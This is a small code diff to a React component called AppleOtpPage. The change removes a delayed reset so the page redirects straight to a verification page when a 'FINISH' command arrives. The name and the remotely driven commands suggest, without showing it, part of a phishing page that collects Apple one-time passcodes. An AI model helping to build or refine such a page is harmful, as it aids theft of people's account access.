@@ -18,10 +18,7 @@ export default function AppleOtpPage() {
             setInvalid(true);
             setIsLoading(false);
         } else if (command === 'FINISH') {
-            setTimeout(() => {
-                resetCommand(); 
-                router.push('/verificationPage');
-            }, 1500);
+            router.push('/verificationPage');
         }
     }, [command, router, resetCommand]);
 
